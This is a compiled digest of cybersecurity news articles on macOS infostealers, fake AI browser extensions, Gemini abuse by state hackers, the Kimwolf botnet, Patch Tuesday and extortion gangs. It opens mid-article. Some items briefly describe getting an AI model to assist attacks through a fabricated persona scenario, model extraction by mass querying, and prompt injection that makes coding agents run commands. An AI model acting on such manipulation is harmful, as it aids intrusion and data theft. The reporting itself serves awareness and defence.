The campaign is particularly resilient because attackers continuously generate new GitHub repositories using automated account creation, highlighting how trusted developer platforms and search engines are increasingly abused as scalable malware distribution infrastructure.

AI-Driven Dissemination Channels

ClawHavoc wasn’t AMOS’s first AI campaign. In December 2025, Huntress reported that AMOS is targeting ChatGPT users. The threat actors used the ChatGPT shared chat feature to host malicious “installation guides” directly on a trusted domain (chatgpt.com), making the lure significantly more convincing.

Victims are driven there mainly via paid search ads (SEO poisoning/malvertising) promoting a fake “ChatGPT Atlas browser for macOS”, then instructed to run a one-line terminal command, effectively turning the user into the execution mechanism.

This example shows yet again that threat actors are weaponizing AI content hype as part of their malware distribution.

Traditional Dissemination Channels

Modern macOS infostealer campaigns rely heavily on social engineering–driven distribution rather than technical exploits. Threat actors commonly create fake installers for popular software such as Tor Browser, Photoshop, or Microsoft Office, packaging malware inside realistic-looking DMG disk images.

In parallel, they use malvertising through platforms like Google Ads to drive victims to spoofed download sites that closely mimic legitimate vendors.

For example, users searching for legitimate software may be redirected to look-alike domains hosting malicious installers that silently deploy stealers such as AMOS.

Another growing tactic is the use of instruction-based execution techniques (often called ClickFix), where victims are guided to run commands themselves in the macOS Terminal.

Instead of exploiting system vulnerabilities, attackers rely on convincing installation instructions, which ultimately execute the malware payload. For instance, asking users to drag files into Terminal or paste commands.

Together, these methods reflect a shift toward abusing user trust, brand impersonation, and legitimate distribution channels to bypass traditional security controls and increase infection success rates.

The Underground Economy Model

The AMOS ecosystem operates as a structured Malware-as-a-Service (MaaS) supply chain, where the developers (often tracked in underground forums as AMOS sellers or affiliates) provide the stealer platform, updates, infrastructure components, and sometimes management panels for a subscription cost historically advertised around ~$1,000 per month, typically paid in cryptocurrency.

Downstream threat actors purchase access to the stealer kit, customize lures or distribution channels (malvertising, fake installers, phishing, SEO poisoning, supply-chain abuse, or social engineering campaigns), and focus on maximizing infection volume.

The primary output is a list of stolen credentials, PII, and session logs. This becomes a tradable commodity in underground markets.

These stealer logs are purchased by secondary actors such as access brokers, account takeover specialists, and crypto cash-out operators, who use them for follow-on operations, including SaaS account compromise, financial fraud, ransomware initial access, or cryptocurrency theft.

This multi-stage monetization model turns AMOS infections into a repeatable revenue pipeline, where each actor in the chain specializes in development, distribution, or monetization, reflecting the broader industrialization of the modern infostealer economy.

Unlike traditional malware that focuses on persistence, defense evasion, lateral movement, or destruction, infostealers prioritize speed, data coverage, and stealth, allowing attackers to quickly convert stolen data into usable access.

The resulting “stealer logs” are then sold or traded in underground markets, where other threat actors use them for account takeover, lateral movement, fraud, or follow-on attacks, defacto making infostealers a foundational data-supply layer for the broader cybercrime economy.

The distributor layer is where we typically see the “innovative” or “creative” side of these campaigns - and it’s what usually makes the headlines. This is the layer behind narratives like “AMOS is now targeting AI apps” or “AMOS campaigns are hitting LastPass users.”

In reality, the core malware developers often remain consistent, occasionally adding a new feature or improving packaging and evasion, but the underlying capability set changes incrementally.

The downstream log consumers also tend to operate with established, repeatable monetization techniques.

The distributors, however, are the ones driving real campaign evolution: they decide who to target, define campaign scope, choose distribution channels, and continuously refine the psychological and social engineering techniques used to manipulate victims as part of their operational playbook.

[5] BleepingComputer - Fake AI Chrome extensions with 300K users steal credentials, emails
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 08:41:55 -0500
Link: https://www.bleepingcomputer.com/news/security/fake-ai-chrome-extensions-with-300k-users-steal-credentials-emails/

[TAM METİN - 607 kelime]
A set of 30 malicious Chrome extensions that have been installed by more than 300,000 users are masquerading as AI assistants to steal credentials, email content, and browsing information.

Some of the extensions are still present in the Chrome Web Store and have been installed by tens of thousands of users, while others show a small install count.

Researchers at browser security platform LayerX discovered the malicious extension campaign and named it AiFrame. They found that all analyzed extensions are part of the same malicious effort as they communicate with infrastructure under a single domain, tapnetic[.]pro.

According to them, the most popular extension in the AiFrame campaign had 80,000 users and was called Gemini AI Sidebar (fppbiomdkfbhgjjdmojlogeceejinadg), but it is no longer on the Chrome Web Store.

However, BleepingComputer found that other extensions with thousands of users are still present on Google's repository for Chrome extensions. It should be noted that the names may be different in some cases, but the identification is the same.

AI Sidebar (gghdfkafnhfpaooiolhncejnlgglhkhe) – 70,000 users

AI Assistant (nlhpidbjmmffhoogcennoiopekbiglbp) – 60,000 users

ChatGPT Translate (acaeafediijmccnjlokgcdiojiljfpbe) – 30,000 users

AI GPT (kblengdlefjpjkekanpoidgoghdngdgl) – 20,000 users

ChatGPT (llojfncgbabajmdglnkbhmiebiinohek) – 20,000 users

AI Sidebar (djhjckkfgancelbmgcamjimgphaphjdl) – 10,000 users

Google Gemini (fdlagfnfaheppaigholhoojabfaapnhb) – 10,000 users

LayerX found that all 30 extensions share the same internal structure, JavaScript logic, permissions, and backend infrastructure.

The malicious browser add-ons do not implement AI functionality locally; instead, they deliver the promised feature by rendering a full-screen iframe to load content from a remote domain.

This, by itself, is risky, as publishers can change the extensions’ logic at any time without pushing an update - just like in the case of Microsoft Office Add-ins - thus avoiding a new review.

In the background, the extensions extract page content from websites the user visits, including sensitive authentication pages, using Mozilla’s Readability library.

LayerX says that a subset of 15 extensions specifically targets Gmail data, using a dedicated content script that runs at ‘document_start’ on ‘mail.google.com’ and injects UI elements.

The script reads visible email content directly from the DOM and repeatedly extracts email thread text via ‘.textContent.’ The researchers note that even email drafts can be captured.

“When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension’s logic and transmitted to third-party backend infrastructure controlled by the extension operator,” LayerX explains in a report today.

“As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers.”

The extensions also feature a remotely triggered voice recognition and transcript generation mechanism using the ‘Web Speech API,’ returning the results to the operators. Depending on the granted permissions, the extensions may even siphon conversations from the victim’s environment.

BleepingComputer has contacted Google for a comment on LayerX findings, but we have not received a response by publication time.

It is recommended to check LayerX's list of indicators of compromise for the complete set of malicious extensions. If compromise is confirmed, users should reset passwords for all accounts.

[6] BleepingComputer - Google says hackers are abusing Gemini AI for all attacks stages
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 02:00:00 -0500
Link: https://www.bleepingcomputer.com/news/security/google-says-hackers-are-abusing-gemini-ai-for-all-attacks-stages/

[TAM METİN - 770 kelime]
State-backed hackers are using Google's Gemini AI model to support all stages of an attack, from reconnaissance to post-compromise actions.

Bad actors from China (APT31, Temp.HEX), Iran (APT42), North Korea (UNC2970), and Russia used Gemini for target profiling and open-source intelligence, generating phishing lures, translating text, coding, vulnerability testing, and troubleshooting.

Cybercriminals are also showing increased interest in AI tools and services that could help in illegal activities, such as social engineering ClickFix campaigns.

AI-enhanced malicious activity

The Google Threat Intelligence Group (GTIG) notes in a report today that APT adversaries use Gemini to support their campaigns "from reconnaissance and phishing lure creation to command and control  (C2) development and data exfiltration."

Chinese threat actors employed an expert cybersecurity persona to request that Gemini automate vulnerability analysis and provide targeted testing plans in the context of a fabricated scenario.

“The PRC-based threat actor fabricated a scenario, in one case trialing Hexstrike MCP tooling, and directing the model to analyze Remote Code Execution (RCE), WAF bypass techniques, and SQL injection test results against specific US-based targets,” Google says.

Another China-based actor frequently employed Gemini to fix their code, carry out research, and provide advice on technical capabilities for intrusions.

The Iranian adversary APT42 leveraged Google's LLM for social engineering campaigns, as a development platform to speed up the creation of tailored malicious tools (debugging, code generation, and researching exploitation techniques).

Additional threat actor abuse was observed for implementing new capabilities into existing malware families, including the CoinBait phishing kit and the HonestCue malware downloader and launcher.

GTIG notes that no major breakthroughs have occurred in that respect, though the tech giant expects malware operators to continue to integrate AI capabilities into their toolsets.

HonestCue is a proof-of-concept malware framework observed in late 2025 that uses the Gemini API to generate C# code for second-stage malware, then compiles and executes the payloads in memory.

CoinBait is a React SPA-wrapped phishing kit masquerading as a cryptocurrency exchange for credential harvesting. It contains artifacts indicating that its development was advanced using AI code generation tools.

One indicator of LLM use is logging messages in the malware source code that were prefixed with "Analytics:," which could help defenders track data exfiltration processes.

Based on the malware samples, GTIG researchers believe that the malware was created using the Lovable AI platform, as the developer used the Lovable Supabase client and lovable.app.

Cybercriminals also used generative AI services in ClickFix campaigns, delivering the AMOS info-stealing malware for macOS. Users were lured to execute malicious commands through malicious ads listed in search results for queries on troubleshooting specific issues.

The report further notes that Gemini has faced AI model extraction and distillation attempts, with organizations leveraging authorized API access to methodically query the system and reproduce its decision-making processes to replicate its functionality.

Although the problem is not a direct threat to users of these models or their data, it constitutes a significant commercial, competitive, and intellectual property problem for the creators of these models.

Essentially, actors take information obtained from one model and transfer the information to another using a machine learning technique called "knowledge distillation," which is used to train fresh models from more advanced ones.

“Model extraction and subsequent knowledge distillation enable an attacker to accelerate AI model development quickly and at a significantly lower cost,” GTIG researchers say.

Google flags these attacks as a threat because they constitute intellectual theft, they are scalable, and severely undermine the business model of AI-as-a-service, which has the potential to impact end users soon.

In a large-scale attack of this kind, Gemini AI was targeted by 100,000 prompts that posed a series of questions aimed at replicating the model’s reasoning across a range of tasks in non-English languages.

Google has disabled accounts and infrastructure tied to documented abuse, and has implemented targeted defenses in Gemini’s classifiers to make abuse harder.

The company assures that it "designs AI systems with robust security measures and strong safety guardrails" and regularly tests the models to improve their security and safety.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────

Link: https://krebsonsecurity.com/2026/02/patch-tuesday-february-2026-edition/

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Image: Shutterstock.com, @Mungujakisa

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

